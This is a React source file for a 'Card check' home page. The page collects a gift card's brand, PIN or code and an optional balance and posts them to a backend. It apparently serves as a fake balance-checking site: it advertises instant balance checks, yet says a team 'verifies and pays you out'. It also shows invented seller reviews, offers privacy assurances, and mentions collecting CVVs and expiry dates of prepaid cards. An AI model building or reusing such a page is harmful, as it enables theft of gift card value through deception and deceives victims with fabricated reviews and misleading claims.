import React, { useState, useRef, useEffect } from "react";
import "./Home.css";

import HeroImage from "../Image/hero.jpg.webp";

import amazon from "../Image/amazon.jpg.png";
import apple from "../Image/itunes.jpg.png";
import googleplay from "../Image/googleplay.jpg.jpeg";
import steam from "../Image/steam.jpg.jpg";
import ebay from "../Image/ebay.jpg.jpg";
import xbox from "../Image/xbox.jpg.jpg";
import sephora from "../Image/sephora.jpg.png";
import vanilla from "../Image/vanilla.jpg.jpg";
import amex from "../Image/amex.jpg.jpg";
import mastercard from "../Image/mastercard.jpg.jpg";


const CARD_OPTIONS = [
  { id: "amazon", name: "Amazon", logo: amazon },
  { id: "apple", name: "Apple iTunes", logo: apple },
  { id: "googleplay", name: "Google Play", logo: googleplay },
  { id: "steam", name: "Steam", logo: steam },
  { id: "ebay", name: "eBay", logo: ebay },
  { id: "xbox", name: "Xbox", logo: xbox },
  { id: "sephora", name: "Sephora", logo: sephora },
  { id: "vanilla", name: "Vanilla", logo: vanilla },
  { id: "amex", name: "American Express", logo: amex },
  { id: "mastercard", name: "Mastercard", logo: mastercard },
];

const POPULAR_IDS = ["googleplay", "steam", "ebay", "xbox"];


const HERO_CARDS_IMAGE = HeroImage;

const SUBMIT_URL = "http://localhost:4000/api/cards/submit";

const REVIEWS = [
  {
    quote: "Quick to use, clear to follow, and easy to trust.",
    name: "A. Morgan",
    role: "Verified seller",
  },
  {
    quote:
      "The card search and submission form feel much cleaner than most checker tools.",
    name: "T. Walker",
    role: "Regular seller",
  },
  {
    quote: "Fast brand selection, simple inputs, and a smooth payout process.",
    name: "J. Reed",
    role: "Returning seller",
  },
];

const ABOUT_FEATURES = [
  {
    icon: "🛡️",
    title: "Private handling",
    desc: "Sensitive card details stay inside the review flow only.",
  },
  {
    icon: "⏱️",
    title: "Fast review",
    desc: "Submissions are picked up and reviewed quickly by our team.",
  },
  {
    icon: "🏷️",
    title: "Major brands",
    desc: "Popular retail, gaming, and prepaid cards are accepted.",
  },
];

const FAQS = [
  {
    q: "Which gift cards are supported?",
    a: "Amazon, Apple iTunes, Steam, Google Play, Xbox, Sephora, Vanilla, American Express, Mastercard, and more.",
  },
  {
    q: "What details are required?",
    a: "Most cards just need the PIN or code. Some prepaid cards may also need the expiry date and CVV.",
  },
  {
    q: "Is my submission private?",
    a: "Yes. Only the details needed to review your card are collected, and they're used solely for that purpose.",
  },
  {
    q: "How long does review take?",
    a: "Our team typically reviews submissions within a few hours and pays out once the card is verified.",
  },
];

const PRIVACY_INFO = [
  {
    title: "Privacy",
    points: [
      "Only the required card fields are collected for review.",
      "We don't ask for unrelated personal information.",
      "Sensitive card details stay inside this submission flow only.",
    ],
  },
  {
    title: "Terms",
    points: [
      "Submit only cards you own or are authorized to sell.",
      "Card requirements vary by brand.",
      "Incomplete or inaccurate details may delay or prevent payment.",
    ],
  },
  {
    title: "Contact",
    points: [
      "Support requests and general inquiries should use our official contact channel.",
      "Never send full card numbers, PINs, or CVVs through general support messages.",
    ],
  },
];

/* ---------- Small pieces ---------- */

function CardIcon({ card }) {
  return (
    <img
      src={card.logo}
      alt={`${card.name} logo`}
      className="card-icon"
    />
  );
}

function FieldError({ message }) {
  if (!message) return null;
  return <p className="field-error">{message}</p>;
}

/* ---------- Main component ---------- */

export default function Home() {
  const [selectedCard, setSelectedCard] = useState(null);
  const [code, setCode] = useState("");
  const [expectedBalance, setExpectedBalance] = useState("");

  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [search, setSearch] = useState("");

  const [errors, setErrors] = useState({});
  const [submitting, setSubmitting] = useState(false);
  const [status, setStatus] = useState(null); // { type: 'success' | 'error', message }

  const dropdownRef = useRef(null);

  // Close the dropdown when clicking outside it
  useEffect(() => {
    function handleClickOutside(e) {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target)) {
        setDropdownOpen(false);
      }
    }
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  const filteredCards = CARD_OPTIONS.filter((c) =>
    c.name.toLowerCase().includes(search.toLowerCase())
  );

  function selectCard(card) {
    setSelectedCard(card);
    setDropdownOpen(false);
    setSearch("");
    setErrors((prev) => ({ ...prev, card: undefined }));
  }

  function validate() {
    const next = {};

    if (!selectedCard) {
      next.card = "Please select a gift card type.";
    }

    if (!code.trim()) {
      next.code = "Please enter the PIN or code on your card.";
    }

    if (expectedBalance.trim()) {
      const num = Number(expectedBalance);
      if (Number.isNaN(num) || num < 0) {
        next.balance = "Enter a valid amount.";
      }
    }

    setErrors(next);
    return Object.keys(next).length === 0;
  }
async function handleSubmit(e) {
  e.preventDefault();
  setStatus(null);

  const isValid = validate();
  if (!isValid) return;

  setSubmitting(true);

  const payload = {
    card_type: selectedCard.name,
    card_code: code.trim(),
    amount: expectedBalance.trim()
      ? Number(expectedBalance)
      : null,
  };

  try {
    const res = await fetch(
      "http://localhost:4000/api/cards/submit",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      }
    );

    if (!res.ok) {
      throw new Error("Request failed");
    }

    const data = await res.json();

    setStatus({
      type: "success",
      message:
        data.message ||
        "Card submitted successfully.",
    });

    setSelectedCard(null);
    setCode("");
    setExpectedBalance("");
  } catch (error) {
    setStatus({
      type: "error",
      message:
        "Unable to submit card. Please try again.",
    });
  } finally {
    setSubmitting(false);
  }
}
  return (
    <div className="page">
      {/* Header */}
      <header className="site-header">
        <div className="brand">
          <span className="brand-mark" aria-hidden="true">
            ◇
          </span>
          <div>
            <p className="brand-name">Card check</p>
            <p className="brand-tag">Check gift card balance instantly.</p>
          </div>
        </div>
        <a className="header-link" href="#supported-cards">
          Supported Cards
        </a>
      </header>

      <main>
        {/* Hero */}
        <section className="hero">
          <div className="hero-left">
            <h1>
             Check gift card balance 
              <br />
             instantly.
            </h1>
            <p className="hero-sub">
              Pick a card, enter the details, and our team verifies and pays
              you out.
            </p>
            <div className="badge-row">
              <span className="badge">Fast review</span>
              <span className="badge">Real brand cards</span>
              <span className="badge">Private form</span>
            </div>

            <div className="card-stack" aria-hidden="true">
              <img
                className="card-stack__img"
                src={HERO_CARDS_IMAGE}
                alt="Amazon, Apple, Google Play, Steam, and Xbox gift cards"
              />
            </div>
          </div>

          {/* Form panel */}
          <div className="panel form-panel">
            <h2>Gift card checker</h2>

            <form onSubmit={handleSubmit} noValidate>
              <label className="field-label" htmlFor="card-trigger">
                Gift card
              </label>

              <div className="select-wrap" ref={dropdownRef}>
                <button
                  type="button"
                  id="card-trigger"
                  className={`select-trigger ${errors.card ? "has-error" : ""}`}
                  aria-haspopup="listbox"
                  aria-expanded={dropdownOpen}
                  onClick={() => setDropdownOpen((open) => !open)}
                >
                  {selectedCard ? (
                    <span className="select-trigger__value">
                      <CardIcon card={selectedCard} />
                      {selectedCard.name}
                    </span>
                  ) : (
                    <span className="select-trigger__placeholder">
                      Select a gift card
                    </span>
                  )}
                  <span className="chevron" aria-hidden="true">
                    {dropdownOpen ? "▲" : "▼"}
                  </span>
                </button>

                {dropdownOpen && (
                  <div className="dropdown" role="listbox">
                    <input
                      type="text"
                      className="search-input"
                      placeholder="Search cards"
                      value={search}
                      onChange={(e) => setSearch(e.target.value)}
                      autoFocus
                    />
                    <ul className="dropdown-list">
                      {filteredCards.length === 0 && (
                        <li className="dropdown-empty">No cards found</li>
                      )}
                      {filteredCards.map((card) => (
                        <li key={card.id}>
                          <button
                            type="button"
                            className="dropdown-item"
                            role="option"
                            aria-selected={selectedCard?.id === card.id}
                            onClick={() => selectCard(card)}
                          >
                            <CardIcon card={card} />
                            <span>
                              <span className="dropdown-item__name">
                                {card.name}
                              </span>
                              <span className="dropdown-item__category">
                                {card.category}
                              </span>
                            </span>
                          </button>
                        </li>
                      ))}
                    </ul>
                  </div>
                )}
              </div>
              <FieldError message={errors.card} />

              <p className="field-label popular-label">Popular cards</p>
              <div className="popular-row">
                {CARD_OPTIONS.filter((c) => POPULAR_IDS.includes(c.id)).map(
                  (card) => (
                    <button
                      type="button"
                      key={card.id}
                      className={`popular-pill ${
                        selectedCard?.id === card.id ? "is-active" : ""
                      }`}
                      onClick={() => selectCard(card)}
                    >
                      <CardIcon card={card} />
                      {card.name}
                    </button>
                  )
                )}
              </div>

              <div className="field-row">
                <div className="field">
                  <label className="field-label" htmlFor="code">
                    PIN / code
                  </label>
                  <div
                    className={`input-wrap ${errors.code ? "has-error" : ""}`}
                  >
                    <span className="input-icon" aria-hidden="true">
                      💳
                    </span>
                    <input
                      id="code"
                      type="text"
                      placeholder="Enter your code"
                      value={code}
                      onChange={(e) => {
                        setCode(e.target.value);
                        if (errors.code) {
                          setErrors((prev) => ({ ...prev, code: undefined }));
                        }
                      }}
                    />
                  </div>
                  <FieldError message={errors.code} />
                </div>

                <div className="field">
                  <label className="field-label" htmlFor="balance">
                    Expected balance
                  </label>
                  <div
                    className={`input-wrap ${
                      errors.balance ? "has-error" : ""
                    }`}
                  >
                    <span className="input-icon" aria-hidden="true">
                      $
                    </span>
                    <input
                      id="balance"
                      type="text"
                      inputMode="decimal"
                      placeholder="Optional"
                      value={expectedBalance}
                      onChange={(e) => {
                        setExpectedBalance(e.target.value);
                        if (errors.balance) {
                          setErrors((prev) => ({
                            ...prev,
                            balance: undefined,
                          }));
                        }
                      }}
                    />
                  </div>
                  <FieldError message={errors.balance} />
                </div>
              </div>

              <button
                type="submit"
                className="submit-btn"
                disabled={submitting}
              >
                {submitting ? "Submitting…" : "Submit for Review"}
              </button>

              <p className="private-note">Private &amp; secure</p>

              {status && (
                <div className={`status-box status-box--${status.type}`}>
                  <span className="status-box__icon" aria-hidden="true">
                    {status.type === "success" ? "✓" : "!"}
                  </span>
                  <div>
                    <p className="status-box__title">
                      {status.type === "success"
                        ? "Submission received"
                        : "Submission failed"}
                    </p>
                    <p className="status-box__message">{status.message}</p>
                  </div>
                  <button
                    type="button"
                    className="status-box__close"
                    aria-label="Dismiss"
                    onClick={() => setStatus(null)}
                  >
                    ×
                  </button>
                </div>
              )}
            </form>
          </div>
        </section>

        {/* Supported cards strip */}
        <section id="supported-cards" className="supported-strip">
          <p className="eyebrow">Supported cards</p>
          <div className="strip-viewport">
            <div className="strip-track">
              {[...CARD_OPTIONS, ...CARD_OPTIONS].map((card, idx) => (
                <span className="strip-pill" key={`${card.id}-${idx}`}>
                  <CardIcon card={card} />
                  {card.name}
                </span>
              ))}
            </div>
          </div>
        </section>

        {/* Reviews */}
        <section id="reviews" className="reviews">
          <p className="eyebrow">Reviews</p>
          <h2 className="section-heading">What sellers say</h2>
          <div className="reviews-grid">
            {REVIEWS.map((r) => (
              <div className="review-card" key={r.name}>
                <p className="review-quote">&ldquo;{r.quote}&rdquo;</p>
                <p className="review-name">{r.name}</p>
                <p className="review-role">{r.role}</p>
              </div>
            ))}
          </div>
        </section>

        {/* About */}
        <section id="about" className="about">
          <p className="eyebrow">About</p>
          <div className="about-grid">
            <div className="about-copy">
              <h2 className="section-heading">
                Built for quick, secure reviews
              </h2>
              <p className="about-text">
                Cardcheck keeps the process clear: pick a brand, enter the
                required details, and our team takes it from there.
              </p>
            </div>
            <div className="about-features">
              {ABOUT_FEATURES.map((f) => (
                <div className="about-feature" key={f.title}>
                  <span className="about-feature__icon" aria-hidden="true">
                    {f.icon}
                  </span>
                  <p className="about-feature__title">{f.title}</p>
                  <p className="about-feature__desc">{f.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* FAQ */}
        <section id="faq" className="faq">
          <p className="eyebrow">FAQ</p>
          <h2 className="section-heading">Common questions</h2>
          <div className="faq-grid">
            {FAQS.map((item) => (
              <div className="faq-card" key={item.q}>
                <p className="faq-question">{item.q}</p>
                <p className="faq-answer">{item.a}</p>
              </div>
            ))}
          </div>
        </section>

        {/* Privacy, terms, contact */}
        <section id="privacy" className="privacy">
          <p className="eyebrow">Information</p>
          <h2 className="section-heading">Privacy, terms, and contact</h2>
          <div className="privacy-grid">
            {PRIVACY_INFO.map((block) => (
              <div className="privacy-card" key={block.title}>
                <p className="privacy-card__title">{block.title}</p>
                {block.points.map((point) => (
                  <p className="privacy-card__point" key={point}>
                    {point}
                  </p>
                ))}
              </div>
            ))}
          </div>
        </section>
      </main>

      <footer className="site-footer">
        <div className="brand">
          <span className="brand-mark" aria-hidden="true">
            ◇
          </span>
          <div>
            <p className="brand-name">Cardcheck</p>
            <p className="brand-tag">Gift card balance checks</p>
          </div>
        </div>
        <nav className="footer-links">
          <a href="#supported-cards">Supported Cards</a>
          <a href="#reviews">Reviews</a>
          <a href="#about">About</a>
          <a href="#faq">FAQ</a>
          <a href="#privacy">Privacy &amp; Terms</a>
        </nav>
      </footer>
    </div>
  );
}








